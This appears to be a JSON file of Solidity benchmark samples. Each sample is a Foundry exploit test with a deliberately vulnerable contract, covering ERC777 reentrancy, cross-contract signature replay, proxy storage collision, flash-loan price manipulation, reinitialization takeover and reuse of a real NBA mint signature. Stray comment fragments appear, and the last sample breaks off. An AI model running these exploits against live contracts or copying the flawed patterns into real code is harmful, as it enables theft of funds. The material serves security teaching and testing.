[
  {
    "id": "sample_4_0000",
    "language": "solidity",
    "chain": "evm",
    "file_content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.18;\n\nimport \"forge-std/Test.sol\";\nimport \"@openzeppelin/contracts/token/ERC777/ERC777.sol\";\n\n*/\n\ncontract ContractTest is Test {\n    MyERC777 MyERC777TokenContract;\n    SimpleBank SimpleBankContract;\n    address alice = vm.addr(1);\n    address eve = vm.addr(2);\n    bytes32 private constant _TOKENS_SENDER_INTERFACE_HASH =\n        keccak256(\"ERC777TokensSender\");\n    bytes32 private constant _TOKENS_RECIPIENT_INTERFACE_HASH =\n        keccak256(\"ERC777TokensRecipient\");\n\n    function setUp() external {\n        // mock ERC1820Registry contract in foundry\n        vm.etch(\n            address(0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24),\n            bytes(\n                hex\"608060405234801561001057600080fd5b50600436106100a5576000357c010000000000000000000000000000000000000000000000000000000090048063a41e7d5111610078578063a41e7d51146101d4578063aabbb8ca1461020a578063b705676514610236578063f712f3e814610280576100a5565b806329965a1d146100aa5780633d584063146100e25780635df8122f1461012457806365ba36c114610152575b600080fd5b6100e0600480360360608110156100c057600080fd5b50600160a060020a038135811691602081013591604090910135166102b6565b005b610108600480360360208110156100f857600080fd5b5035600160a060020a0316610570565b60408051600160a060020a039092168252519081900360200190f35b6100e06004803603604081101561013a57600080fd5b50600160a060020a03813581169160200135166105bc565b6101c26004803603602081101561016857600080fd5b81019060208101813564010000000081111561018357600080fd5b82018360208201111561019557600080fd5b803590602001918460018302840111640100000000831117156101b757600080fd5b5090925090506106b3565b60408051918252519081900360200190f35b6100e0600480360360408110156101ea57600080fd5b508035600160a060020a03169060200135600160e060020a0319166106ee565b6101086004803603604081101561022057600080fd5b50600160a060020a038135169060200135610778565b61026c6004803603604081101561024c57600080fd5b508035600160a060020a03169060200135600160e060020a0319166107ef565b604080519115158252519081900360200190f35b61026c6004803603604081101561029657600080fd5b508035600160a060020a03169060200135600160e060020a0319166108aa565b6000600160a060020a038416156102cd57836102cf565b335b9050336102db82610570565b600160a060020a031614610339576040805160e560020a62461bcd02815260206004820152600f60248201527f4e6f7420746865206d616e616765720000000000000000000000000000000000604482015290519081900360640190fd5b6103428361092a565b15610397576040805160e560020a62461bcd02815260206004820152601a60248201527f4d757374206e6f7420626520616e204552433136352068617368000000000000604482015290519081900360640190fd5b600160a060020a038216158015906103b85750600160a060020a0382163314155b156104ff5760405160200180807f455243313832305f4143434550545f4d4147494300000000000000000000000081525060140190506040516020818303038152906040528051906020012082600160a060020a031663249cb3fa85846040518363ffffffff167c01000000000000000000000000000000000000000000000000000000000281526004018083815260200182600160a060020a0316600160a060020a031681526020019250505060206040518083038186803b15801561047e57600080fd5b505afa158015610492573d6000803e3d6000fd5b505050506040513d60208110156104a857600080fd5b5051146104ff576040805160e560020a62461bcd02815260206004820181905260248201527f446f6573206e6f7420696d706c656d656e742074686520696e74657266616365604482015290519081900360640190fd5b600160a060020a03818116600081815260208181526040808320888452909152808220805473ffffffffffffffffffffffffffffffffffffffff19169487169485179055518692917f93baa6efbd2244243bfee6ce4cfdd1d04fc4c0e9a786abd3a41313bd352db15391a450505050565b600160a060020a03818116600090815260016020526040812054909116151561059a5750806105b7565b50600160a060020a03808216600090815260016020526040902054165b919050565b336105c683610570565b600160a060020a031614610624576040805160e560020a62461bcd02815260206004820152600f60248201527f4e6f7420746865206d616e616765720000000000000000000000000000000000604482015290519081900360640190fd5b81600160a060020a031681600160a060020a0316146106435780610646565b60005b600160a060020a03838116600081815260016020526040808220805473ffffffffffffffffffffffffffffffffffffffff19169585169590951790945592519184169290917f605c2dbf762e5f7d60a546d42e7205dcb1b011ebc62a61736a57c9089d3a43509190a35050565b600082826040516020018083838082843780830192505050925050506040516020818303038152906040528051906020012090505b92915050565b6106f882826107ef565b610703576000610705565b815b600160a060020a03928316600081815260208181526040808320600160e060020a031996909616808452958252808320805473ffffffffffffffffffffffffffffffffffffffff19169590971694909417909555908152600284528181209281529190925220805460ff19166001179055565b600080600160a060020a038416156107905783610792565b335b905061079d8361092a565b156107c357826107ad82826108aa565b6107b85760006107ba565b815b925050506106e8565b600160a060020a0390811660009081526020818152604080832086845290915290205416905092915050565b6000808061081d857f01ffc9a70000000000000000000000000000000000000000000000000000000061094c565b909250905081158061082d575080155b1561083d576000925050506106e8565b61084f85600160e060020a031961094c565b909250905081158061086057508015155b15610870576000925050506106e8565b61087a858561094c565b909250905060018214801561088f5750806001145b1561089f576001925050506106e8565b506000949350505050565b600160a060020a0382166000908152600260209081526040808320600160e060020a03198516845290915281205460ff1615156108f2576108eb83836107ef565b90506106e8565b50600160a060020a03808316600081815260208181526040808320600160e060020a0319871684529091529020549091161492915050565b7bffffffffffffffffffffffffffffffffffffffffffffffffffffffff161590565b6040517f01ffc9a7000000000000000000000000000000000000000000000000000000008082526004820183905260009182919060208160248189617530fa90519096909550935050505056fea165627a7a72305820377f4a2d4301ede9949f163f319021a6e9c687c292a5e2b2c4734c126b524e6c0029\"\n            )\n        );\n        MyERC777TokenContract = new MyERC777(0);\n    }\n\n    function testERC777Reentrancy() public {\n        // Register IERC1820Registry\n        IERC1820Registry registry = IERC1820Registry(\n            address(0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24)\n        );\n        // tokensReceived Hook\n        // The token contract MUST call the tokensReceived hook of the recipient if the recipient registers an ERC777TokensRecipient implementation via ERC-1820.\n        registry.setInterfaceImplementer(\n            address(this),\n            _TOKENS_RECIPIENT_INTERFACE_HASH,\n            address(this)\n        );\n        //set up env\n        SimpleBankContract = new SimpleBank(address(MyERC777TokenContract));\n        MyERC777TokenContract.mint(address(SimpleBankContract), 10000, \"\", \"\");\n\n        console.log(\n            \"Maximum claims is 1,000 for each EOA, How can you bypass this limitation?\"\n        );\n        console.log(\n            \"Before exploiting, My GLD Balance :\",\n            MyERC777TokenContract.balanceOf(address(this))\n        );\n        SimpleBankContract.claim(address(this), 900); // claim token to trigger callback function `tokensReceived()`.\n        // Expect 900 (the claim amount), but we will get the 1,900 due to reenter to claim 1,000.\n        console.log(\n            \"After exploiting, My GLD Balance :\",\n            MyERC777TokenContract.balanceOf(address(this))\n        );\n    }\n\n    function tokensReceived(\n        address payable operator,\n        address from,\n        address to,\n        uint256 amount,\n        bytes calldata data,\n        bytes calldata operatorData\n    ) external {\n        if (MyERC777TokenContract.balanceOf(address(this)) <= 1000) {\n            console.log(\"Reentered\");\n            SimpleBank(operator).claim(address(this), 1000);\n        }\n    }\n\n    receive() external payable {}\n}\n\ncontract MyERC777 is ERC777 {\n    constructor(\n        uint256 initialSupply\n    ) ERC777(\"Gold\", \"GLD\", new address[](0)) {}\n    function mint(\n        address account,\n        uint256 amount,\n        bytes memory userData,\n        bytes memory operatorData\n    ) public returns (bool) {\n        _mint(account, amount, userData, operatorData);\n        return true;\n    }\n}\n\ncontract SimpleBank is Test {\n    ERC777 private token;\n    uint maxMintsPerAddress = 1000;\n    mapping(address => uint256) public _mints;\n    bytes32 private constant _TOKENS_RECIPIENT_INTERFACE_HASH =\n        keccak256(\"ERC777TokensRecipient\");\n\n    function setUp() external {\n        // mock ERC1820Registry contract in foundry\n        vm.etch(\n            address(0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24),\n            bytes(\n                hex\"608060405234801561001057600080fd5b50600436106100a5576000357c010000000000000000000000000000000000000000000000000000000090048063a41e7d5111610078578063a41e7d51146101d4578063aabbb8ca1461020a578063b705676514610236578063f712f3e814610280576100a5565b806329965a1d146100aa5780633d584063146100e25780635df8122f1461012457806365ba36c114610152575b600080fd5b6100e0600480360360608110156100c057600080fd5b50600160a060020a038135811691602081013591604090910135166102b6565b005b610108600480360360208110156100f857600080fd5b5035600160a060020a0316610570565b60408051600160a060020a039092168252519081900360200190f35b6100e06004803603604081101561013a57600080fd5b50600160a060020a03813581169160200135166105bc565b6101c26004803603602081101561016857600080fd5b81019060208101813564010000000081111561018357600080fd5b82018360208201111561019557600080fd5b803590602001918460018302840111640100000000831117156101b757600080fd5b5090925090506106b3565b60408051918252519081900360200190f35b6100e0600480360360408110156101ea57600080fd5b508035600160a060020a03169060200135600160e060020a0319166106ee565b6101086004803603604081101561022057600080fd5b50600160a060020a038135169060200135610778565b61026c6004803603604081101561024c57600080fd5b508035600160a060020a03169060200135600160e060020a0319166107ef565b604080519115158252519081900360200190f35b61026c6004803603604081101561029657600080fd5b508035600160a060020a03169060200135600160e060020a0319166108aa565b6000600160a060020a038416156102cd57836102cf565b335b9050336102db82610570565b600160a060020a031614610339576040805160e560020a62461bcd02815260206004820152600f60248201527f4e6f7420746865206d616e616765720000000000000000000000000000000000604482015290519081900360640190fd5b6103428361092a565b15610397576040805160e560020a62461bcd02815260206004820152601a60248201527f4d757374206e6f7420626520616e204552433136352068617368000000000000604482015290519081900360640190fd5b600160a060020a038216158015906103b85750600160a060020a0382163314155b156104ff5760405160200180807f455243313832305f4143434550545f4d4147494300000000000000000000000081525060140190506040516020818303038152906040528051906020012082600160a060020a031663249cb3fa85846040518363ffffffff167c01000000000000000000000000000000000000000000000000000000000281526004018083815260200182600160a060020a0316600160a060020a031681526020019250505060206040518083038186803b15801561047e57600080fd5b505afa158015610492573d6000803e3d6000fd5b505050506040513d60208110156104a857600080fd5b5051146104ff576040805160e560020a62461bcd02815260206004820181905260248201527f446f6573206e6f7420696d706c656d656e742074686520696e74657266616365604482015290519081900360640190fd5b600160a060020a03818116600081815260208181526040808320888452909152808220805473ffffffffffffffffffffffffffffffffffffffff19169487169485179055518692917f93baa6efbd2244243bfee6ce4cfdd1d04fc4c0e9a786abd3a41313bd352db15391a450505050565b600160a060020a03818116600090815260016020526040812054909116151561059a5750806105b7565b50600160a060020a03808216600090815260016020526040902054165b919050565b336105c683610570565b600160a060020a031614610624576040805160e560020a62461bcd02815260206004820152600f60248201527f4e6f7420746865206d616e616765720000000000000000000000000000000000604482015290519081900360640190fd5b81600160a060020a031681600160a060020a0316146106435780610646565b60005b600160a060020a03838116600081815260016020526040808220805473ffffffffffffffffffffffffffffffffffffffff19169585169590951790945592519184169290917f605c2dbf762e5f7d60a546d42e7205dcb1b011ebc62a61736a57c9089d3a43509190a35050565b600082826040516020018083838082843780830192505050925050506040516020818303038152906040528051906020012090505b92915050565b6106f882826107ef565b610703576000610705565b815b600160a060020a03928316600081815260208181526040808320600160e060020a031996909616808452958252808320805473ffffffffffffffffffffffffffffffffffffffff19169590971694909417909555908152600284528181209281529190925220805460ff19166001179055565b600080600160a060020a038416156107905783610792565b335b905061079d8361092a565b156107c357826107ad82826108aa565b6107b85760006107ba565b815b925050506106e8565b600160a060020a0390811660009081526020818152604080832086845290915290205416905092915050565b6000808061081d857f01ffc9a70000000000000000000000000000000000000000000000000000000061094c565b909250905081158061082d575080155b1561083d576000925050506106e8565b61084f85600160e060020a031961094c565b909250905081158061086057508015155b15610870576000925050506106e8565b61087a858561094c565b909250905060018214801561088f5750806001145b1561089f576001925050506106e8565b506000949350505050565b600160a060020a0382166000908152600260209081526040808320600160e060020a03198516845290915281205460ff1615156108f2576108eb83836107ef565b90506106e8565b50600160a060020a03808316600081815260208181526040808320600160e060020a0319871684529091529020549091161492915050565b7bffffffffffffffffffffffffffffffffffffffffffffffffffffffff161590565b6040517f01ffc9a7000000000000000000000000000000000000000000000000000000008082526004820183905260009182919060208160248189617530fa90519096909550935050505056fea165627a7a72305820377f4a2d4301ede9949f163f319021a6e9c687c292a5e2b2c4734c126b524e6c0029\"\n            )\n        );\n    }\n    constructor(address nftAddress) {\n        token = ERC777(nftAddress);\n\n        // Register IERC1820Registry\n        IERC1820Registry registry = IERC1820Registry(\n            address(0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24)\n        );\n        registry.setInterfaceImplementer(\n            address(this),\n            _TOKENS_RECIPIENT_INTERFACE_HASH,\n            address(this)\n        );\n    }\n\n    function claim(address account, uint256 amount) public returns (bool) {\n        // Check if total claims for the address would exceed max mints per address.\n        require(\n            _mints[account] + amount <= maxMintsPerAddress,\n            \"Exceeds max mints per address\"\n        );\n\n        token.transfer(account, amount);\n        _mints[account] += amount; // Do not follow check-effect-interaction\n\n        return true;\n    }\n\n    function tokensReceived(\n        address operator,\n        address from,\n        address to,\n        uint256 amount,\n        bytes calldata data,\n        bytes calldata operatorData\n    ) external {}\n    receive() external payable {}\n}\n",
    "pragma": "",
    "difficulty_tier": 4,
    "context_level": "intra_contract"
  },
  {
    "id": "sample_4_0001",
    "language": "solidity",
    "chain": "evm",
    "file_content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.18;\n\nimport \"forge-std/Test.sol\";\n\n*/\n\ncontract ContractTest is Test {\n    TokenWhale TokenWhaleContract;\n    SixEyeToken SixEyeTokenContract;\n    address alice = vm.addr(1);\n    address bob = vm.addr(2);\n\n    constructor() {\n        TokenWhaleContract = new TokenWhale();\n        TokenWhaleContract.TokenWhaleDeploy(address(this));\n        TokenWhaleContract.transfer(alice, 1000);\n        SixEyeTokenContract = new SixEyeToken();\n        SixEyeTokenContract.TokenWhaleDeploy(address(this));\n        SixEyeTokenContract.transfer(alice, 1000);\n    }\n\n    function testSignatureReplay() public {\n        emit log_named_uint(\n            \"Balance\",\n            TokenWhaleContract.balanceOf(address(this))\n        );\n\n        bytes32 hash = keccak256(\n            abi.encodePacked(\n                address(alice),\n                address(bob),\n                uint256(499),\n                uint256(1),\n                uint256(0)\n            )\n        );\n        emit log_named_bytes32(\"hash\", hash);\n\n        // The {r, s, v} signature can be combined into one 65-byte-long sequence: 32 bytes for r , 32 bytes for s , and one byte for v\n        //r - a point on the secp256k1 elliptic curve (32 bytes)\n        //s - a point on the secp256k1 elliptic curve (32 bytes)\n        //v - recovery id (1 byte)\n\n        (uint8 v, bytes32 r, bytes32 s) = vm.sign(1, hash);\n        emit log_named_uint(\"v\", v);\n        emit log_named_bytes32(\"r\", r);\n        emit log_named_bytes32(\"s\", s);\n\n        address alice_address = ecrecover(hash, v, r, s);\n        emit log_named_address(\"alice_address\", alice_address);\n        emit log_string(\n            \"If attacker got the Alice's signature, the attacker can replay this signature on the others contracts with same method.\"\n        );\n        vm.startPrank(bob);\n\n        TokenWhaleContract.transferProxy(\n            address(alice),\n            address(bob),\n            499,\n            1,\n            v,\n            r,\n            s\n        );\n        // Bob successfully transferred funds from Alice.\n        emit log_named_uint(\n            \"SET token balance of Bob\",\n            TokenWhaleContract.balanceOf(address(bob))\n        );\n\n        // Because we have nonce protect to replay, so we can not replay again in the same contract.\n        // BTW this nonce start from 0, it's not a best practice.\n        // TokenWhaleContract.transferProxy(address(alice),address(bob),499,1,v,r,s);\n        // emit log_named_uint(\"Balance of Bob\",TokenWhaleContract.balanceOf(address(bob)));\n\n        emit log_string(\n            \"Try to replay to another contract with same signature\"\n        );\n        emit log_named_uint(\n            \"Before the replay, SIX token balance of bob:\",\n            SixEyeTokenContract.balanceOf(address(bob))\n        );\n\n        SixEyeTokenContract.transferProxy(\n            address(alice),\n            address(bob),\n            499,\n            1,\n            v,\n            r,\n            s\n        );\n        emit log_named_uint(\n            \"After the replay, SIX token balance of bob:\",\n            SixEyeTokenContract.balanceOf(address(bob))\n        );\n\n        SixEyeTokenContract.transferProxy(\n            address(alice),\n            address(bob),\n            499,\n            1,\n            v,\n            r,\n            s\n        );\n        emit log_named_uint(\n            \"After the second replay, SIX token balance of bob:\",\n            SixEyeTokenContract.balanceOf(address(bob))\n        );\n    }\n}\n\ncontract TokenWhale is Test {\n    address player;\n\n    uint256 public totalSupply;\n    mapping(address => uint256) public balanceOf;\n    mapping(address => mapping(address => uint256)) public allowance;\n\n    string public name = \"Simple ERC20 Token\";\n    string public symbol = \"SET\";\n    uint8 public decimals = 18;\n    mapping(address => uint256) nonces;\n\n    function TokenWhaleDeploy(address _player) public {\n        player = _player;\n        totalSupply = 2000;\n        balanceOf[player] = 2000;\n    }\n\n    function _transfer(address to, uint256 value) internal {\n        balanceOf[msg.sender] -= value;\n        balanceOf[to] += value;\n    }\n\n    function transfer(address to, uint256 value) public {\n        require(balanceOf[msg.sender] >= value);\n        require(balanceOf[to] + value >= balanceOf[to]);\n\n        _transfer(to, value);\n    }\n\n    function transferProxy(\n        address _from,\n        address _to,\n        uint256 _value,\n        uint256 _feeUgt,\n        uint8 _v,\n        bytes32 _r,\n        bytes32 _s\n    ) public returns (bool) {\n        uint256 nonce = nonces[_from];\n        emit log_named_uint(\"nonce\", nonce);\n        bytes32 h = keccak256(\n            abi.encodePacked(_from, _to, _value, _feeUgt, nonce)\n        );\n        if (_from != ecrecover(h, _v, _r, _s)) revert();\n\n        if (\n            balanceOf[_to] + _value < balanceOf[_to] ||\n            balanceOf[msg.sender] + _feeUgt < balanceOf[msg.sender]\n        ) revert();\n        balanceOf[_to] += _value;\n\n        balanceOf[msg.sender] += _feeUgt;\n\n        balanceOf[_from] -= _value + _feeUgt;\n        nonces[_from] = nonce + 1;\n        return true;\n    }\n}\n\ncontract SixEyeToken is Test {\n    address player;\n\n    uint256 public totalSupply;\n    mapping(address => uint256) public balanceOf;\n    mapping(address => mapping(address => uint256)) public allowance;\n\n    string public name = \"Six Eye Token\";\n    string public symbol = \"SIX\";\n    uint8 public decimals = 18;\n    mapping(address => uint256) nonces;\n\n    function TokenWhaleDeploy(address _player) public {\n        player = _player;\n        totalSupply = 2000;\n        balanceOf[player] = 2000;\n    }\n\n    function _transfer(address to, uint256 value) internal {\n        balanceOf[msg.sender] -= value;\n        balanceOf[to] += value;\n    }\n\n    function transfer(address to, uint256 value) public {\n        require(balanceOf[msg.sender] >= value);\n        require(balanceOf[to] + value >= balanceOf[to]);\n\n        _transfer(to, value);\n    }\n\n    function transferProxy(\n        address _from,\n        address _to,\n        uint256 _value,\n        uint256 _feeUgt,\n        uint8 _v,\n        bytes32 _r,\n        bytes32 _s\n    ) public returns (bool) {\n        uint256 nonce = nonces[_from];\n        bytes32 h = keccak256(\n            abi.encodePacked(_from, _to, _value, _feeUgt, nonce)\n        );\n        if (_from != ecrecover(h, _v, _r, _s)) revert();\n\n        if (\n            balanceOf[_to] + _value < balanceOf[_to] ||\n            balanceOf[msg.sender] + _feeUgt < balanceOf[msg.sender]\n        ) revert();\n        balanceOf[_to] += _value;\n\n        balanceOf[msg.sender] += _feeUgt;\n\n        balanceOf[_from] -= _value + _feeUgt;\n        return true;\n    }\n}\n",
    "pragma": "",
    "difficulty_tier": 4,
    "context_level": "intra_contract"
  },
  {
    "id": "sample_4_0002",
    "language": "solidity",
    "chain": "evm",
    "file_content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.18;\n\nimport \"forge-std/Test.sol\";\n\n*/\n\ncontract ContractTest is Test {\n    Logic LogicContract;\n    Proxy ProxyContract;\n\n    function testStorageCollision() public {\n        LogicContract = new Logic();\n        ProxyContract = new Proxy(address(LogicContract));\n\n        console.log(\n            \"Current implementation contract address:\",\n            ProxyContract.implementation()\n        );\n        ProxyContract.testcollision();\n        console.log(\n            \"overwritten slot0 implementation contract address:\",\n            ProxyContract.implementation()\n        );\n        console.log(\"Exploit completed\");\n    }\n\n    receive() external payable {}\n}\n\ncontract Proxy {\n    address public implementation; //slot0\n\n    constructor(address _implementation) {\n        implementation = _implementation;\n    }\n\n    function testcollision() public {\n        bool success;\n        (success, ) = implementation.delegatecall(\n            abi.encodeWithSignature(\"foo(address)\", address(this))\n        );\n    }\n}\n\ncontract Logic {\n    address public GuestAddress; //slot0\n\n    constructor() {\n        GuestAddress = address(0x0);\n    }\n\n    function foo(address _addr) public {\n        GuestAddress = _addr;\n    }\n}\n",
    "pragma": "",
    "difficulty_tier": 4,
    "context_level": "intra_contract"
  },
  {
    "id": "sample_4_0003",
    "language": "solidity",
    "chain": "evm",
    "file_content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.18;\n\nimport \"forge-std/Test.sol\";\nimport \"@openzeppelin/contracts/token/ERC20/ERC20.sol\";\nimport \"@openzeppelin/contracts/access/Ownable.sol\";\n\n*/\n\ncontract ContractTest is Test {\n    USDa USDaContract;\n    USDb USDbContract;\n    SimplePool SimplePoolContract;\n    SimpleBank SimpleBankContract;\n\n    function setUp() public {\n        USDaContract = new USDa();\n        USDbContract = new USDb();\n        SimplePoolContract = new SimplePool(\n            address(USDaContract),\n            address(USDbContract)\n        );\n        SimpleBankContract = new SimpleBank(\n            address(USDaContract),\n            address(SimplePoolContract),\n            address(USDbContract)\n        );\n    }\n\n    function testPrice_Manipulation() public {\n        USDbContract.transfer(address(SimpleBankContract), 9000 ether);\n        USDaContract.transfer(address(SimplePoolContract), 1000 ether);\n        USDbContract.transfer(address(SimplePoolContract), 1000 ether);\n        // Get the current price of USDa in terms of USDb (initially 1 USDa : 1 USDb)\n        SimplePoolContract.getPrice(); // 1 USDa : 1 USDb\n\n        console.log(\n            \"There are 1000 USDa and USDb in the pool, so the price of USDa is 1 to 1 USDb.\"\n        );\n        emit log_named_decimal_uint(\n            \"Current USDa convert rate\",\n            SimplePoolContract.getPrice(),\n            18\n        );\n        console.log(\"Start price manipulation\");\n        console.log(\"Borrow 500 USBa over floashloan\");\n        // Let's manipulate the price since the getPrice is over the balanceOf.\n        // Use flashloan to borrow 500 USDa\n        SimplePoolContract.flashLoan(500 ether, address(this), \"0x0\");\n    }\n\n    fallback() external {\n        //flashlon callback\n\n        emit log_named_decimal_uint(\n            \"Price manupulated, USDa convert rate\",\n            SimplePoolContract.getPrice(),\n            18\n        ); // 1 USDa : 2 USDb\n\n        USDaContract.approve(address(SimpleBankContract), 100 ether);\n        SimpleBankContract.exchange(100 ether);\n\n        // Repay the flashloan by transferring 500 USDb to SimplePoolContract\n        USDaContract.transfer(address(SimplePoolContract), 500 ether);\n\n        // Get the balance of USDb owned by us.\n        emit log_named_decimal_uint(\n            \"Use 100 USDa to convert, My USDb balance\",\n            USDbContract.balanceOf(address(this)),\n            18\n        );\n    }\n\n    receive() external payable {}\n}\n\ncontract USDa is ERC20, Ownable {\n    constructor() ERC20(\"USDA\", \"USDA\") {\n        _mint(msg.sender, 10000 * 10 ** decimals());\n    }\n\n    function mint(address to, uint256 amount) public onlyOwner {\n        _mint(to, amount);\n    }\n}\n\ncontract USDb is ERC20, Ownable {\n    constructor() ERC20(\"USDB\", \"USDB\") {\n        _mint(msg.sender, 10000 * 10 ** decimals());\n    }\n\n    function mint(address to, uint256 amount) public onlyOwner {\n        _mint(to, amount);\n    }\n}\n\ncontract SimplePool {\n    IERC20 public USDaToken;\n    IERC20 public USDbToken;\n\n    constructor(address _USDa, address _USDb) {\n        USDaToken = IERC20(_USDa);\n        USDbToken = IERC20(_USDb);\n    }\n\n    function getPrice() public view returns (uint256) {\n        //Incorrect price calculation over balanceOf\n        uint256 USDaAmount = USDaToken.balanceOf(address(this));\n        uint256 USDbAmount = USDbToken.balanceOf(address(this));\n\n        // Ensure USDbAmount is not zero to prevent division by zero\n        if (USDaAmount == 0) {\n            return 0;\n        }\n\n        // Calculate the price as the ratio of USDa to USDb\n        uint256 USDaPrice = (USDbAmount * (10 ** 18)) / USDaAmount;\n        return USDaPrice;\n    }\n\n    function flashLoan(\n        uint256 amount,\n        address borrower,\n        bytes calldata data\n    ) public {\n        uint256 balanceBefore = USDaToken.balanceOf(address(this));\n        require(balanceBefore >= amount, \"Not enough liquidity\");\n        require(\n            USDaToken.transfer(borrower, amount),\n            \"Flashloan transfer failed\"\n        );\n        (bool success, ) = borrower.call(data);\n        require(success, \"Flashloan callback failed\");\n        uint256 balanceAfter = USDaToken.balanceOf(address(this));\n        require(balanceAfter >= balanceBefore, \"Flashloan not repaid\");\n    }\n}\n\ncontract SimpleBank {\n    IERC20 public token; //USDA\n    SimplePool public pool;\n    IERC20 public payoutToken; //USDb\n\n    constructor(address _token, address _pool, address _payoutToken) {\n        token = IERC20(_token);\n        pool = SimplePool(_pool);\n        payoutToken = IERC20(_payoutToken);\n    }\n\n    function exchange(uint256 amount) public {\n        require(\n            token.transferFrom(msg.sender, address(this), amount),\n            \"Transfer failed\"\n        );\n        uint256 price = pool.getPrice();\n        require(price > 0, \"Price cannot be zero\");\n        uint256 tokensToReceive = (amount * price) / (10 ** 18);\n        require(\n            payoutToken.transfer(msg.sender, tokensToReceive),\n            \"Payout transfer failed\"\n        );\n    }\n}\n",
    "pragma": "",
    "difficulty_tier": 4,
    "context_level": "intra_contract"
  },
  {
    "id": "sample_4_0004",
    "language": "solidity",
    "chain": "evm",
    "file_content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.18;\n\nimport \"forge-std/Test.sol\";\nimport \"@openzeppelin/contracts/proxy/transparent/TransparentUpgradeableProxy.sol\";\n\n// We take Audius as an example. For more details, you can refer to Audius Governance Takeover Post-Mortem 7/23/22 and Remediation.\n// https://blog.audius.co/article/audius-governance-takeover-post-mortem-7-23-22\n\ninterface ILogic {\n    function getguardianAddress() external returns (address);\n\n    function getproxyAdmin() external returns (address);\n\n    function initialize(address) external;\n\n    function getinitializing() external returns (bool);\n\n    function getinitialized() external returns (bool);\n\n    function isConstructor() external view returns (bool);\n}\n\ncontract ContractTest is Test {\n    Logic LogicContract;\n    TestProxy ProxyContract;\n\n    function testStorageCollision() public {\n        LogicContract = new Logic();\n        ProxyContract = new TestProxy(\n            address(LogicContract),\n            address(msg.sender),\n            address(this)\n        );\n\n        console.log(\n            \"Current guardianAddress:\",\n            ILogic(address(ProxyContract)).getguardianAddress()\n        );\n        console.log(\n            \"Current initializing boolean:\",\n            ILogic(address(ProxyContract)).getinitializing()\n        );\n        console.log(\n            \"Current initialized boolean:\",\n            ILogic(address(ProxyContract)).getinitialized()\n        );\n        console.log(\"Try to call initialize to change guardianAddress\");\n        ILogic(address(ProxyContract)).initialize(address(msg.sender));\n\n        console.log(\n            \"After initializing, changed guardianAddress to attacker:\",\n            ILogic(address(ProxyContract)).getguardianAddress()\n        );\n        console.log(\n            \"After initializing,  initializing boolean is still true:\",\n            ILogic(address(ProxyContract)).getinitializing()\n        );\n        console.log(\n            \"After initializing,  initialized boolean:\",\n            ILogic(address(ProxyContract)).getinitialized()\n        );\n\n*/\n\n        console.log(\"Exploit completed\");\n    }\n\n    receive() external payable {}\n}\n\ncontract TestProxy is TransparentUpgradeableProxy {\n    address private proxyAdmin; // slot 0 - storage collision here\n\n    constructor(\n        address _logic,\n        address _admin,\n        address guardianAddress\n    )\n        TransparentUpgradeableProxy(\n            _logic,\n            _admin,\n            abi.encodeWithSelector(\n                bytes4(0xc4d66de8), // bytes4(keccak256(\"initialize(address)\"))\n                guardianAddress\n            )\n        )\n    {\n        proxyAdmin = _admin;\n    }\n}\n\ncontract Initializable {\n     */\n    bool private initialized;\n\n     */\n    bool private initializing;\n\n     */\n    modifier initializer() {\n        require(\n            initializing || isConstructor() || !initialized,\n            \"Contract instance has already been initialized\"\n        );\n\n        bool isTopLevelCall = !initializing;\n        if (isTopLevelCall) {\n            initializing = true;\n            initialized = true;\n        }\n\n        _;\n\n        if (isTopLevelCall) {\n            initializing = false;\n        }\n    }\n\n    /// @dev Returns true if and only if the function is running in the constructor\n    function isConstructor() private view returns (bool) {\n        // extcodesize checks the size of the code stored in an address, and\n        // address returns the current address. Since the code is still not\n        // deployed when running a constructor, any checks on its code size will\n        // yield zero, making it an effective way to detect if a contract is\n        // under construction or not.\n        address self = address(this);\n        uint256 cs;\n        assembly {\n            cs := extcodesize(self)\n        }\n        return cs == 0;\n    }\n\n    // Reserved storage space to allow for layout changes in the future.\n    uint256[50] private ______gap;\n\n    function getinitializing() public view returns (bool) {\n        return initializing;\n    }\n\n    function getinitialized() public view returns (bool) {\n        return initialized;\n    }\n}\n\ncontract Logic is Initializable {\n    address private guardianAddress;\n\n    function initialize(address _guardianAddress) public initializer {\n        guardianAddress = _guardianAddress; //Guardian address becomes the only party\n    }\n\n    function getguardianAddress() public view returns (address) {\n        return guardianAddress;\n    }\n}\n",
    "pragma": "",
    "difficulty_tier": 4,
    "context_level": "intra_contract"
  },
  {
    "id": "sample_4_0005",
    "language": "solidity",
    "chain": "evm",
    "file_content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.18;\n\nimport \"forge-std/Test.sol\";\n\n*/\ninterface INBA {\n    struct vData {\n        bool mint_free;\n        uint256 max_mint;\n        address from;\n        uint256 start;\n        uint256 end;\n        uint256 eth_price;\n        uint256 dust_price;\n        bytes signature;\n    }\n\n    function mint_approved(\n        vData memory info,\n        uint256 number_of_items_requested,\n        uint16 _batchNumber\n    ) external;\n}\n\ncontract ContractTest is Test {\n    NBA NBAContract;\n\n    function testMintNFT() public {\n        NBAContract = new NBA();\n        // Copy any successful signature from etherscan.\n        // https://etherscan.io/tx/0x0555d3d7a9d1d5659cd99c69f15fb88da57307c3970678fb5e6547879bc548a6\n        INBA.vData memory info = INBA.vData({\n            mint_free: true,\n            max_mint: 1,\n            from: 0x23Bd1adaB0917A2Ed5007aA39e4040487BE2DAd1,\n            start: 0,\n            end: 5555555555,\n            eth_price: 0,\n            dust_price: 0,\n            signature: hex\"b3589c052ba90e14654d1fac78fb2fd9708355e1a686bed502f65e7ac0a47ad722dcc6c0dcc9445f608162648e000dcc8a845c2ed523202465dc9bdd239484b51b\"\n        });\n        INBA(address(NBAContract)).mint_approved(info, 20, 0);\n    }\n\n    receive() external payable {}\n}\n\ncontract NBA is Test {\n    uint16 public batchNumber;\n\n    address signer = 0x669F499e7BA51836BB76F7dD2bc3C1A37a5342D7;\n    struct vData {\n        bool mint_free;\n        uint256 max_mint;\n        address from;\n        uint256 start;\n        uint256 end;\n        uint256 eth_price;\n        uint256 dust_price;\n        bytes signature;\n    }\n\n    function mint_approved(\n        vData memory info,\n        uint256 number_of_items_requested,\n        uint16 _batchNumber\n    ) external view {\n        